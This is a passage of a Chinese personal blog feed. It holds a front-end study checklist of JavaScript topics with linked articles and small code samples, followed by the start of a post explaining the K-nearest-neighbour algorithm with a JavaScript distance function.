class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    oldX = e.<span class="property">clientX</span>; <span class="comment">//存储鼠标当前位置(初始化位置)</span></span><br><span class="line">    oldY = e.<span class="property">clientY</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">left</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">top</span>) &#123;</span><br><span class="line">      <span class="comment">//如果元素无初始值,则需要赋值</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">left</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">top</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 鼠标移动事件</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">onmousemove</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">      newX = e.<span class="property">clientX</span>; <span class="comment">//存储移动后的鼠标位置</span></span><br><span class="line">      newY = e.<span class="property">clientY</span>;</span><br><span class="line">      <span class="comment">// 移动后的位置 = 当前位置 - (移动后的鼠标位置-移动前的鼠标位置)</span></span><br><span class="line">      ele.<span class="property">style</span>.<span class="property">top</span> = <span class="built_in">parseFloat</span>(ele.<span class="property">style</span>.<span class="property">top</span>) + (newY - oldY) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">      ele.<span class="property">style</span>.<span class="property">left</span> = <span class="built_in">parseFloat</span>(ele.<span class="property">style</span>.<span class="property">left</span>) + (newX - oldX) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      oldX = newX; <span class="comment">//移动完后旧鼠标位置为新鼠标位置</span></span><br><span class="line">      oldY = newY;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 鼠标松开事件</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">onmouseup</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="comment">// 解绑事件</span></span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">onmousemove</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">onmouseup</span> = <span class="literal">null</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>js drag api</p><p><a href="https://www.cnblogs.com/moqiutao/p/6365113.html">HTML5 拖放（Drag 和 Drop）详解与实例 - 风雨后见彩虹 - 博客园 (cnblogs.com)</a></p><p>在被拖动的元素上需定义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./PoinkoParrot2.jpeg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;draggable&quot;</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>在拖放的过程中会触发以下事件：</p><ul><li><p>在拖动目标上触发事件(源元素):</p><ul><li>ondragstart - 用户开始拖动元素时触发</li><li>ondrag - 元素正在拖动时触发</li><li>ondragend - 用户完成元素拖动后触发</li></ul></li><li><p>释放目标时触发的事件:</p><ul><li>ondragenter - 当被鼠标拖动的对象进入其容器范围内时触发此事件</li><li>ondragover - 当某被拖动的对象在另一对象容器范围内拖动时触发此事件</li><li>ondragleave - 当被鼠标拖动的对象离开其容器范围内时触发此事件</li><li>ondrop - 在一个拖动过程中，释放鼠标键时触发此事件</li></ul></li></ul></li><li><p>eval</p><ul><li><a href="https://juejin.cn/post/6938775708739207182">Eval</a></li><li><a href="https://juejin.cn/post/6844903713140637709">你不知道的 eval</a></li><li><a href="https://juejin.cn/post/6954380745871720462">欺骗词法 eval 和 with</a></li></ul></li><li><p>AMD、CMD、CommonJs</p><ul><li><a href="https://es6.ruanyifeng.com/#docs/module-loader">Module 的加载实现 - ECMAScript 6入门</a></li><li><a href="https://juejin.cn/post/6844903576309858318">前端模块化：CommonJS,AMD,CMD,ES6</a></li></ul></li><li><p>🟠js监听对象属性改变（vue属性监听）</p><ul><li><a href="https://juejin.cn/post/6844903842828533767">论如何监听一个对象某个属性的变化</a></li></ul></li><li><p>JS实现跨域</p><ul><li><a href="https://ypigy.gitee.io/2020/07/20/AJAX/#%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93">笔记</a></li></ul></li><li><p>JS深度拷贝（浅拷贝、深拷贝…）</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/05/study/image-20211222145748666.png" alt="image-20211222145748666"></p></li><li><p>重排重绘</p><ul><li><a href="https://juejin.cn/post/6844903745914929165">浏览器重绘(repaint)重排(reflow)与优化</a></li></ul></li><li><p>🟠JS全排列</p><ul><li><p><a href="https://juejin.cn/post/6844904191379374087">前端电商 sku 的全排列算法很难吗？学会这个套路，彻底掌握排列组合</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> combine = <span class="keyword">function</span> (<span class="params">...chunks</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">let</span> helper = <span class="keyword">function</span> (<span class="params">chunkIndex, prev</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> chunk = chunks[chunkIndex];</span><br><span class="line">    <span class="keyword">let</span> isLast = chunkIndex === chunks.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> val <span class="keyword">of</span> chunk) &#123;</span><br><span class="line">      <span class="keyword">let</span> cur = prev.<span class="title function_">concat</span>(val);</span><br><span class="line">      <span class="keyword">if</span> (isLast) &#123;</span><br><span class="line">        <span class="comment">// 如果已经处理到数组的最后一项了 则把拼接的结果放入返回值中</span></span><br><span class="line">        res.<span class="title function_">push</span>(cur); <span class="comment">//将最后一个数组的所有选项分别压入</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">helper</span>(chunkIndex + <span class="number">1</span>, cur);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 从属性数组下标为 0 开始处理</span></span><br><span class="line">  <span class="comment">// 并且此时的 prev 是个空数组</span></span><br><span class="line">  <span class="title function_">helper</span>(<span class="number">0</span>, []);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> names = [<span class="string">&#x27;iPhone X&#x27;</span>, <span class="string">&#x27;iPhone XS&#x27;</span>];</span><br><span class="line">  <span class="keyword">let</span> colors = [<span class="string">&#x27;黑色&#x27;</span>, <span class="string">&#x27;白色&#x27;</span>];</span><br><span class="line">  <span class="keyword">let</span> storages = [<span class="string">&#x27;64g&#x27;</span>, <span class="string">&#x27;256g&#x27;</span>];</span><br><span class="line">  <span class="keyword">let</span> res = <span class="title function_">combine</span>(names, colors, storages);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  <span class="comment">/* result</span></span><br><span class="line"><span class="comment">  [</span></span><br><span class="line"><span class="comment">    [ &#x27;iPhone X&#x27;, &#x27;黑色&#x27;, &#x27;64g&#x27; ],</span></span><br><span class="line"><span class="comment">    [ &#x27;iPhone X&#x27;, &#x27;黑色&#x27;, &#x27;256g&#x27; ],</span></span><br><span class="line"><span class="comment">    [ &#x27;iPhone X&#x27;, &#x27;白色&#x27;, &#x27;64g&#x27; ],</span></span><br><span class="line"><span class="comment">    [ &#x27;iPhone X&#x27;, &#x27;白色&#x27;, &#x27;256g&#x27; ],</span></span><br><span class="line"><span class="comment">    [ &#x27;iPhone XS&#x27;, &#x27;黑色&#x27;, &#x27;64g&#x27; ],</span></span><br><span class="line"><span class="comment">    [ &#x27;iPhone XS&#x27;, &#x27;黑色&#x27;, &#x27;256g&#x27; ],</span></span><br><span class="line"><span class="comment">    [ &#x27;iPhone XS&#x27;, &#x27;白色&#x27;, &#x27;64g&#x27; ],</span></span><br><span class="line"><span class="comment">    [ &#x27;iPhone XS&#x27;, &#x27;白色&#x27;, &#x27;256g&#x27; ]</span></span><br><span class="line"><span class="comment">  ]</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure><p>  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/05/study/image-20211224151929493.png" alt="image-20211224151929493"></p></li></ul></li><li><p>this指向、隐式丢失、显式绑定</p><ul><li><a href="https://juejin.cn/post/6844904113352736776">this绑定的四种方式：new，显式，隐式，默认</a></li></ul></li><li><p>🟠virtual dom</p><ul><li><a href="https://juejin.cn/post/6844903609667321863">探索Virtual DOM的前世今生</a></li><li><a href="https://juejin.cn/post/6844903615652610055">深入框架本源系列 —— Virtual Dom</a></li><li><a href="https://juejin.cn/post/6844903921442422791">面试官问: 如何理解Virtual DOM？</a></li></ul></li><li><p>vue生命周期</p></li><li><p>🔴🟠Promise底层实现</p></li><li><p>事件监听</p><ul><li><a href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM 事件对象</a></li><li><a href="https://juejin.cn/post/6844903886960984072">一篇文章能否解决你事件监听的许多疑问</a></li><li>🔴🔵<a href="https://juejin.cn/post/6844903647197790221">撸一个JS的事件管理</a></li><li>🔵<a href="https://juejin.cn/post/6844904069820055560">🔥JavaScript 自定义事件如此简单！</a></li></ul></li><li><p>Generator</p><ul><li><p><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023024381818112">generator</a></p></li><li><p>基本使用</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// generator</span></span><br><span class="line"><span class="keyword">function</span>* <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">  <span class="keyword">yield</span> x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">yield</span> x + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> res = <span class="title function_">foo</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="title function_">next</span>());<span class="comment">//&#123; value: 2, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="title function_">next</span>());<span class="comment">//&#123; value: 3, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="title function_">next</span>());<span class="comment">//&#123; value: 4, done: true &#125;</span></span><br></pre></td></tr></table></figure></li></ol><ul><li><p>生成自增id函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>* <span class="title function_">next_id</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> id = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="comment">// !不是阻塞执行，是yield时跳出函数并储存当时的状态。</span></span><br><span class="line">    <span class="comment">// !执行next()时还原当时的状态，从上次yield的位置向下执行</span></span><br><span class="line">    <span class="keyword">yield</span> ++id;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = <span class="title function_">next_id</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">//1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">//2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">//3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">//4</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">next</span>().<span class="property">value</span>); <span class="comment">//5</span></span><br></pre></td></tr></table></figure></li></ul><ol start="22"><li><p>arguments（箭头函数）</p><ul><li><a href="https://juejin.cn/post/6844903616231260174">ES6 系列之箭头函数</a></li><li><a href="https://juejin.cn/post/6844903801799835655">详解箭头函数和普通函数的区别以及箭头函数的注意事项、不适用场景</a></li><li><a href="https://juejin.cn/post/6844904152640782343">曾经我以为我很懂箭头函数</a></li><li><a href="https://juejin.cn/post/6844904133409914894">对阮一峰《ES6 入门》中箭头函数 this 描述的探究</a></li></ul></li><li><p>🔴🟠🔵继承</p><ul><li><a href="https://juejin.cn/post/6844903696111763470">JavaScript常用八种继承方案</a></li><li><a href="https://juejin.cn/post/6844904094948130824">🔥比继承家业还要简单的JS继承题-封装篇(牛刀小试)</a></li><li><a href="https://juejin.cn/post/6844903475021627400">JS原型链与继承</a></li></ul></li><li><p>🔴script——async属性</p><ul><li><a href="https://juejin.cn/post/6844903560879013896">defer和async</a></li><li><a href="https://juejin.cn/post/6894629999215640583">defer和async简洁版</a></li></ul></li><li><p>🔴jsonp——跨域的解决</p><ul><li><a href="https://ypigy.gitee.io/2020/07/20/AJAX/#%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93">笔记</a></li><li><a href="https://juejin.cn/post/6844903462551945230">原生 JavaScript 实现 AJAX、JSONP</a></li><li><a href="https://juejin.cn/post/6844903976505344013">一分钟说完JSONP请求</a></li></ul></li><li><p>🔴ajax的返回状态——Fetch</p><ul><li><a href="https://juejin.cn/post/6844903618764603399">Ajax原理一篇就够了</a></li><li><a href="https://ypigy.gitee.io/2020/07/20/AJAX/">AJAX笔记 | Dong</a></li><li><a href="https://www.ruanyifeng.com/blog/2020/12/fetch-tutorial.html">Fetch API 教程 - 阮一峰的网络日志 (ruanyifeng.com)</a></li></ul></li><li><p>dns预加载（缓存）dns-preFetch</p><ul><li><a href="https://juejin.cn/post/6844903492490887182">DNS Prefetching 的正确使用姿势</a></li><li><a href="https://juejin.cn/post/6915204591730556935">preload、prefetch、preconnect 和 dns-prefetch 知多少</a></li></ul></li><li><p>🔵函数柯里化（currying）</p><ul><li><a href="https://www.jianshu.com/p/2975c25e4d71">详解JS函数柯里化</a></li></ul></li><li><p>骨架屏</p><p><a href="https://www.jianshu.com/p/a72263d2d105">什么是骨架屏 - 简书 (jianshu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/96455668">如何实现优美的骨架屏 - 知乎 (zhihu.com)</a></p></li><li><p>🔴启动性能（异步）（前端性能优化）</p><ul><li><a href="https://juejin.cn/post/6892994632968306702">前端性能优化 24 条建议（2020） - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/6904517485349830670">工作中如何进行前端性能优化(21种优化+7种定位方式) - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/7020212914020302856">写在 2021 的前端性能优化指南 - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/6844904195707895816">前端性能优化总结 - 掘金 (juejin.cn)</a></li></ul></li><li><p>HTTP缓存机制</p><p><a href="https://juejin.cn/post/6844904100035821575#heading-59">（建议精读）HTTP灵魂之问，巩固你的 HTTP 知识体系 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844903634002509832">面试精选之http缓存 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844903517702848526">HTTP—-HTTP缓存机制 - 掘金 (juejin.cn)</a></p></li><li><p>websocket、AJAX</p><p><a href="https://juejin.cn/post/6844903544978407431">WebSocket：5分钟从入门到精通 - 掘金 (juejin.cn)</a></p></li><li><p>TCP/IP模型（计算机网络）</p><p><a href="https://ypigy.gitee.io/2021/04/18/运输层/#传输控制协议TCP概述">计算机网络-运输层 | Dong (gitee.io)</a></p><p>[计算机网络-网络层 | Dong (gitee.io)](<a href="https://ypigy.gitee.io/2021/04/18/网络层/#网际协议">https://ypigy.gitee.io/2021/04/18/网络层/#网际协议</a> IP)</p></li><li><p>🟠gulp、webpack（打包原理）</p><p><a href="https://juejin.cn/post/6844903802382860296#heading-6">Webpack 模块打包原理 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6917069979913289736#heading-15">对比webpack，你更应该先掌握gulp【10分钟教你彻底掌握gulp】 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844904038543130637#heading-22">webpack打包原理 ? 看完这篇你就懂了 ! - 掘金 (juejin.cn)</a></p></li><li><p>PWA</p><p><a href="https://juejin.cn/post/6844904052166230030">面试官：请你实现一个PWA 我：😭 - 掘金 (juejin.cn)</a></p></li><li><p>🔴单元测试</p><p><a href="https://juejin.cn/post/7039108357554176037">如何做前端单元测试 - 掘金 (juejin.cn)</a><br><a href="https://juejin.cn/post/7049293284883038238">前端单元测试入门与最佳实践 - 掘金 (juejin.cn)</a></p></li><li><p>🔴seo优化</p><p><a href="https://segmentfault.com/a/1190000019623624_vueseo">基于Vue SEO的四种方案 - SegmentFault 思否</a></p><p><a href="https://juejin.cn/post/6980167371864424456">前端搜索引擎优化（SEO）的技巧 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844903824428105735#heading-4">前端SEO优化 - 掘金 (juejin.cn)</a></p></li><li><p>grid栅格布局</p><p><a href="https://juejin.cn/post/6854573220306255880">最强大的 CSS 布局 —— Grid 布局 - 掘金 (juejin.cn)</a></p></li><li><p>bigint</p><p><a href="https://juejin.cn/post/6844903902295359502">JS最新基本数据类型：BigInt - 掘金 (juejin.cn)</a></p></li><li><p>🔴🟠0.1+0.2 ？（是0.3吗）</p><p><a href="https://juejin.cn/post/7056934829920616461">用了一天时间，我终于彻底搞懂了 0.1+0.2 是否等于 0.3！ - 掘金 (juejin.cn)</a></p></li><li><p>osi七层模型（计算机网路）</p><p><a href="https://ypigy.gitee.io/categories/计算机网络/">分类: 计算机网络 | Dong (gitee.io)</a></p></li><li><p>🔴head、状态码</p><p><a href="https://ypigy.gitee.io/2020/07/28/http协议/">http协议 | Dong (gitee.io)</a></p><p><a href="https://blog.csdn.net/wzx19840423/article/details/79073087">http状态码总结_wzx19840423的专栏-CSDN博客_http状态码</a></p><p><a href="https://blog.csdn.net/u014346301/article/details/53995333">HTTP状态码（HTTP Status Code）_Sweet oDream-CSDN博客</a></p></li><li><p>声明式绑定（REACT Query/ Apollo GtaphQL Client）<br>等有学react再来吧</p></li><li><p>假数据生产（Yapi、RAP2、Apifox）</p><ol><li><a href="https://hellosean1025.github.io/yapi/index.html">YApi 接口管理平台 (hellosean1025.github.io)</a></li><li><a href="http://rap2.taobao.org/account/login">RAP接口管理平台 (taobao.org)</a></li><li><a href="https://github.com/thx/rap2-delos">阿里妈妈前端团队出品的开源接口管理工具RAP第二代</a></li><li><a href="https://www.apifox.cn/">Apifox</a></li></ol></li><li><p>BFF架构</p><p><a href="https://juejin.cn/post/6950530370810937352">第 016 期 前后端经常争吵？ - BFF 了解一下 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/7008840813069205512">微服务/API时代的前端开发] BFF入门–5个实用的BFF使用案例 - 掘金 (juejin.cn)</a></p><p><a href="https://juejin.cn/post/6844903959333699598">初识BFF架构设计 - 掘金 (juejin.cn)</a></p></li><li><p>🔴文档碎片</p><p><a href="https://juejin.cn/post/7012073594918273032">前端性能优化：创建文档碎片 - 掘金 (juejin.cn)</a></p><p><a href="https://zhuanlan.zhihu.com/p/408738417">性能优化之文档碎片 - 知乎 (zhihu.com)</a></p></li><li><p>🔴宏任务、微任务（同步异步）</p><p>直接看js代码and思维导图（可以的话整个笔记）</p></li><li><p>compose函数</p><p><a href="https://juejin.cn/post/6844904061821517832">JavaScript中的compose函数和pipe函数 - 掘金 (juejin.cn)</a></p></li><li><p>forEach跳出循环（终止并返回值）</p><p><a href="https://juejin.cn/post/6971972782292729886">面试官问我JS中forEach能不能跳出循环 - 掘金 (juejin.cn)</a>看完看看评论，挺有意思的</p></li><li><p>shell命令</p><p><a href="https://juejin.cn/post/6844903489911406599">Shell常见命令实践 - 掘金 (juejin.cn)</a></p></li><li><p>git命令</p><ol><li>合并代码冲突（merge&amp;rebase）</li><li>代码回滚（reset&amp;checkout）</li><li>代码暂存（stash）</li></ol></li><li><p>linux命令</p></li><li><p>Element.</p><ol><li>getBounding</li><li>IntersectionOberver</li><li>createNodeIterator</li><li>getComputedStyle</li><li>getPropertyValue</li><li>MutationObserver</li></ol></li><li><p>ES6常用方法</p><ul><li><a href="https://juejin.cn/post/6906398702269628424">混子前端24个解决工作问题的ES6代码片段 - 掘金 (juejin.cn)</a></li></ul></li></ol><h2 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h2><ol><li><a href="https://chinese.freecodecamp.org/learn">编程学习</a></li><li>面试题：<ul><li><a href="https://juejin.cn/post/6989422484722286600">2021年我的前端面试准备 - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/7035259189966405668">面试的时候面试官是这样问我Js基础的，角度真刁钻 - 掘金 (juejin.cn)</a></li></ul></li><li><a href="https://juejin.cn/post/7013247812628381704">组件库</a></li><li><a href="https://juejin.cn/post/7026339412799651876">Vue源码(一些数据结构)</a></li><li><a href="https://juejin.cn/post/7025868886914400293">现代web开发困局</a></li><li><a href="https://www.zhihu.com/question/458213150">为什么 WeakSet 和 WeakMap 无法获取到元素的数量，也无法迭代其中的元素</a></li><li><a href="https://segmentfault.com/a/1190000018605776">JS垃圾回收机制</a></li><li><a href="https://www.cnblogs.com/coco1s/p/5499469.html">前端性能优化</a></li><li><a href="https://segmentfault.com/a/1190000012571492">gzip</a></li><li><a href="https://segmentfault.com/a/1190000012353473">PWA</a></li><li><a href="https://juejin.cn/post/7007206194276204575#heading-26">前端学习路线以及知识体系：</a></li><li><a href="https://juejin.cn/post/7038297948630827039">11个非常有用的HTML单行代码🎃 - 掘金 (juejin.cn)</a></li><li><a href="https://juejin.cn/post/7048916480032768013">「前端该如何优雅地Mock数据🏃」每个前端都应该学会的技巧 - 掘金 (juejin.cn)</a></li></ol>]]></content>
    
    <summary type="html">
    
      记录一下看过的前端知识点，进行汇总并整理
    
    </summary>
    
    
      <category term="web" scheme="http://Dong-666.github.io/categories/web/"/>
    
    
      <category term="web" scheme="http://Dong-666.github.io/tags/web/"/>
    
      <category term="前端" scheme="http://Dong-666.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>K最近邻算法KNN</title>
    <link href="http://dong-666.github.io/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/"/>
    <id>http://dong-666.github.io/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/</id>
    <published>2022-02-20T10:00:00.000Z</published>
    <updated>2022-03-02T08:00:45.300Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>KNN（K- Nearest Neighbor）法即K最邻近法，最初由 Cover和Hart于1968年提出，是一个理论上比较成熟的方法，也是最简单的机器学习算法之一。该方法的思路非常简单直观：如果一个样本在特征空间中的K个最相似（即特征空间中最邻近）的样本中的大多数属于某一个类别，则该样本也属于这个类别。该方法在定类决策上只依据最邻近的一个或者几个样本的类别来决定待分样本所属的类别 </p><p>该方法的不足之处是计算量较大，因为对每一个待分类的文本都要计算它到全体已知样本的距离，才能求得它的K个最邻近点。目前常用的解决方法是事先对已知样本点进行剪辑，事先去除对分类作用不大的样本。另外还有一种 Reverse KNN法，它能降低KNN算法的计算复杂度，提高分类的效率 </p><p>KNN算法比较适用于样本容量比较大的类域的自动分类，而那些样本容量较小的类域采用这种算法比较容易产生误分</p></blockquote><h2 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h2><ol><li>准备数据，对数据进行预处理 。</li><li>计算测试样本点（也就是待分类点）到其他每个样本点的距离</li><li>对每个距离进行排序，然后选择出距离最小的K个点</li><li>对K个点所属的类别进行比较，根据少数服从多数的原则，将测试样本点归入在K个点中占比最高的那一类</li></ol><h2 id="特征抽取"><a href="#特征抽取" class="headerlink" title="特征抽取"></a>特征抽取</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/image-20220221221648768.png" alt="image-20220221221648768"></p><p>使用毕达哥拉斯公式计算A和B的相似性（距离），值越小，相似性越大</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/image-20220221215435440.png" alt="image-20220221215435440"></p><h2 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/02/20/K%E6%9C%80%E8%BF%91%E9%82%BB%E7%AE%97%E6%B3%95/image-20220221221838593.png" alt="image-20220221221838593"></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>原理上挺简单的，所以没解释，直接上代码，包含两个函数，一个毕达哥拉斯公式，一个KNN算法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 毕达哥拉斯  Math.sqrt((x1-x2)² + (y1 - y2)²)</span></span><br><span class="line"><span class="comment">// 传参：目标对象1，目标对象2，是否返回详细结果（默认否）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pythagoras</span>(<span class="params">obj1, obj2, returnDetail = <span class="literal">false</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> res = [];</span><br><span class="line">  <span class="keyword">let</span> common = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> obj1) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj2[key]) &#123;</span><br><span class="line">      res.<span class="title function_">push</span>(<span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="built_in">parseFloat</span>(obj1[key]) - <span class="built_in">parseFloat</span>(obj2[key]), <span class="number">2</span>)); <span class="comment">//差值取平方</span></span><br><span class="line">      common.<span class="title function_">push</span>(key);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(res.<span class="title function_">reduce</span>(<span class="function">(<span class="params">cur, next</span>) =&gt;</span> (cur += next), <span class="number">0</span>)).<span class="title function_">toFixed</span>(<span class="number">2</span>); <span class="comment">//累加取平方根且保留两位小数</span></span><br><span 